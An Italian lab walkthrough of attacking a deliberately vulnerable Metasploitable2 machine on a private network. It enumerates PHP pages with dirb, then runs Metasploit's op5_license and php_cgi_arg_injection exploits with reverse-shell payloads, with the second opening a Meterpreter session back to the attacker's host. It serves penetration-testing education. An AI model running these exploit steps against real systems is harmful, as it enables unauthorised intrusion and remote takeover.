# PHP

Vedremo adesso come sarebbe possibile accedere alla macchina metasploitable2 attraverso varie strade:
La più semplice consiste nel fare proprio il footprinting del servizio, quindi per prima cosa colleghiamoci ad esso attraverso un browser

<img src="/imgs/HTTP_grabbing.png" width="400"> </br>

Come al solito l'informazione che otteniamo per accedere al terminale è msfadmin/

Ma passiamo a qualcosa di più interessante. Per prima cosa utilizziamo un tool già installato sulla nostra macchina Kali, ovvero Dirb, il quale si occupa di fare __Web Context Scanner__ e quindi si occupa di trovare tutti i Web Object (nascosti o meno). Sostanzialmente funziona lanciando un attacco basato su dizionario, presente già sulla macchina Kali all'indirizzo __"/usr/share/wordlists/dirb/big.txt"__, e analizzando le risposte che ci vengono fornite.

Le pagine HTTP presentano una serie di valori in base allo stato della pagina, l'elenco è facilmente trovabile online https://it.wikipedia.org/wiki/Codici_di_stato_HTTP.

Ora per le nostre necessità abbiamo bisogno di lanciare il seguente comando, il quale si occuperà di usare il dizionario __big.txt__ con il flag __-X__ effettuiamo la ricerca per trovare i path presenti nel dizionario con estensione __.php__. Se lo lanciassimo senza quest'opzione troverebbe tutti i possibili percorsi nascosti che combaciano con quelli nel dizionario.

Il risultato è mostrato di seguito:
```
root@kali:~# dirb http://192.168.139.129 /usr/share/wordlists/dirb/big.txt -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 12 23:43:37 2021
URL_BASE: http://192.168.139.129/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.139.129/ ----
+ http://192.168.139.129/index.php (CODE:200|SIZE:891)                                                                                                    
+ http://192.168.139.129/phpinfo.php (CODE:200|SIZE:48119)                                                                                                
                                                                                                                                                          
-----------------
END_TIME: Sun Dec 12 23:44:01 2021
DOWNLOADED: 20458 - FOUND: 2

```

La cosa più bella di Dirb è che i risultati ottenuti possono essere aperti direttamente fornendo una vista del risultato

<img src="/imgs/HTTP_Dirb.png" width="500"> </br>

Così facendo abbiamo la possibilità di usare il file per effettuare l'enumerazione di tutti i servizi attivi e le risorse della macchina. Ma torniamo all'utilizzo di metasploit, il file __phpinfo.php__ ci dà anche informazioni sulla versione di php attiva sul server. Vediamo cosa trova metasploid:
```
root@kali:~# msfconsole

msf6 > search php 5.4.2

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/multi/http/op5_license                       2012-01-05       excellent  Yes    OP5 license.php Remote Command Execution
   1  exploit/multi/http/php_cgi_arg_injection             2012-05-03       excellent  Yes    PHP CGI Argument Injection
   2  exploit/windows/http/php_apache_request_headers_bof  2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/php_apache_request_headers_bof
```

Abbiamo non uno ma ben tre exploit disponibili, di cui due con una classificazione __Excellent__ concentramoci su questi. 

## op5_license 

Il primo __exploit/multi/http/op5_license__ ci permette di eseguire comandi da remoto come root sulla macchina targhet, il nostro compito è quindi mandare un payload da far eseguire per garantirci una shell sulla macchina. Il payload selezionato di default è __php/meterpreter/reverse_tcp__ il quale cerca di iniettare un payload per permettere una "reverse connection" che è usata per superare le impostazioni dei firewall, noi cerceremo di aprire una reverse shell creata tramite python. Un firewall hardware generalmente blocca il traffico in arrivo su tutte le porte non imponendo invece alcun tipo di restrizione sul traffico in uscita. Meterpreter è un payload estensibile dinamicamente tramite injection in memoria di moduli detti stagers, per approfondimenti si rimanda alla spiegazione nella sezione __postgreSQL__.

```
msf6 > use 0
msf6 exploit(multi/http/op5_license) > show options

Module options (exploit/multi/http/op5_license):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    443              yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /license.php     yes       The full URI path to license.php
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(multi/http/op5_license) > set rhosts 192.168.139.129
rhosts => 192.168.139.129

msf6 exploit(multi/http/op5_license) > show payloads

Compatible Payloads
===================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                            normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                       normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/bind_ruby                            normal  No     Unix Command Shell, Bind TCP (via Ruby)
   3  payload/cmd/unix/bind_ruby_ipv6                       normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4  payload/cmd/unix/reverse_perl                         normal  No     Unix Command Shell, Reverse TCP (via Perl)
   5  payload/cmd/unix/reverse_perl_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   6  payload/cmd/unix/reverse_python                       normal  No     Unix Command Shell, Reverse TCP (via Python)
   7  payload/cmd/unix/reverse_python_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via python)
   8  payload/cmd/unix/reverse_ruby                         normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   9  payload/cmd/unix/reverse_ruby_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   
msf6 exploit(multi/http/op5_license) > set payload 6
payload => cmd/unix/reverse_python
msf6 exploit(multi/http/op5_license) > set Lhost 192.168.139.128
Lhost => 192.168.139.128
msf6 exploit(multi/http/op5_license) > run

[*] Started reverse TCP handler on 192.168.139.128:4444 
[*] Sending request to https://192.168.139.129:443/license.php
[-] No response from the server
[*] Exploit completed, but no session was created.
```

Che cosa è successo? L'exploit è completato ma nessuna sessione è stata creata. Quello che è successo è, fortunatamente, l'unico errore che può avere questo exploit ovvero il server non risponde e questo potrebbe essere perché la macchina target non riesce ad interpretare python oppure potrebbe non avere la porta richiesta aperta.

## php_cgi_arg_injection

Mentre la seconda opzione __exploit/multi/http/php_cgi_arg_injection__ ci informa sulla vulnerabiltià di argument injection. Nello specifico questo modulo sfrutta il flag __-d__ per impostare l'esecuzione di codice nella pagina php.ini.

Ma prima una piccola nota su che cos'è CGI, contrariamente alla sigla comune che si rifà alla computer grafica qui si intende __Common Gateway Interface__ ed è una tecnologia standard usata dai web server per interfacciarsi con applicazioni esterne generando contenuti web dinamici. Il CGI viene implementato lato server e quando ad un web server arriva la richiesta di un documento CGI il server esegue il programma  e al termine invia al web browser l'output del programma. Il file CGI è un semplice programma già compilato (codice oggetto) e la directory predefinita degli script CGI è /cgi-bin/, anche se a volte è preferibile modificarla, per evitare i frequenti attacchi dai bot sui file in quella cartella.

Quindi se otteniamo l'accesso ad un server compromesso possimo permettere l'esecuzione di script .cgi e caricare una reverse shell la quale ci permette di aprire un'interfaccia verso il target.

```
msf6 > use 1

msf6 exploit(multi/http/php_cgi_arg_injection) > set lhost 192.168.139.128
lhost => 192.168.139.128
msf6 exploit(multi/http/php_cgi_arg_injection) > set rhost 192.168.139.129
rhost => 192.168.139.129
msf6 exploit(multi/http/php_cgi_arg_injection) > exploit

[*] Started reverse TCP handler on 192.168.139.128:4444 
[*] Sending stage (39282 bytes) to 192.168.139.129
[*] Meterpreter session 1 opened (192.168.139.128:4444 -> 192.168.139.129:41864) at 2021-12-13 00:45:40 -0500

meterpreter > sessions
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>
```
Abbiamo aperto una sessione, ma perché meterpreter non ci permette di usare nessun comando classico come: ls, whoami, etc. Semplicemente non possiamo perché abbiamo istanziato un payload reverse_tcp e in questo momento stiamo visitando la macchina target come se fosse un vero e proprio sito. Il multi/handler, è una porzione di codice utilizzata per simulare il comportamento di funzionalità software che gestisce gli exploit al di fuori del framework metasploit, si aspetta una connessione da un payload meterpreter non da un web browser. 
